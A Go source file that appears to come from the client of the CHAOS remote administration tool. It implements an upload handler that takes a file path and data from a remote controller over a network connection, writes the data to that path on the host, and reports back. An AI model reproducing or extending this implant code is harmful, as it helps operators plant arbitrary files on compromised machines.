package upload

import (
	"encoding/json"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
	"os"
	"path/filepath"
)

type UploadUseCase struct {
	Connection net.Conn
}

func NewUploadUseCase(conn net.Conn) usecase.Upload {
	return &UploadUseCase{
		Connection: conn,
	}
}

func (u UploadUseCase) File(data []byte) {
	var errData models.Error
	var upload models.Upload
	if err := json.Unmarshal(data, &upload); err != nil {
		log.Error(err)
		errData.HasError = true
		errData.Message = err.Error()
	}

	dir, _ := filepath.Split(upload.FilepathTo)
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		log.Error(err)
		errData.HasError = true
		errData.Message = err.Error()
	}

	if !errData.HasError {
		if err := util.WriteFile(upload.FilepathTo, upload.Data); err != nil {
			log.Error(err)
			errData.HasError = true
			errData.Message = err.Error()
		}
	}

	if err := network.Send(u.Connection, models.Message{
		Command: "upload",
		Error:   errData,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending upload response")
	}
}
